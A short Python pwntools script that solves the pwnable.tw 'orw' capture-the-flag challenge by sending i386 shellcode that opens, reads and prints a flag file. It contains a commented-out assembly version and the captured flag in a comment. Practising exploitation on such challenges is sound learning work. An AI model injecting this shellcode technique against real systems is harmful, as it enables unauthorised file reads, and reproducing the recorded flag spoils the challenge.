from pwn import *

fpath = "./orw"
debug = 0


if debug:
    p = process(fpath)
else:
	p = remote("chall.pwnable.tw" , 10001) # pwnable.tw orw

p.recv()

# shellcode = 
#  """mov eax, 3  
#     mov ebx, 0  
#     mov ecx, esp
#     mov edx, 200 
#     int 0x80

#     mov eax, 0x5
#     mov ebx, ecx
#     mov ecx, 0x0
#     mov edx, 0xc2
#     int 0x80
    
#     mov ebx, eax
#     mov eax, 3
#     mov ecx, esp   
#     mov edx, 100
#     int 0x80

#     mov edx,eax
#     mov eax, 4
#     mov ebx, 1
#     mov ecx, esp
#     int 0x80"""

# p.sendline(asm(shellcode))
# p.sendline("/home/orw/flag\x00")
shellcode = shellcraft.i386.linux.open("/home/orw/flag\x00")
shellcode += shellcraft.i386.linux.read("eax", "esp",0x30)
shellcode += shellcraft.i386.linux.write(1 , "esp" , 0x30)
p.send(asm(shellcode))
print "recv : ",
print p.recv() # FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}



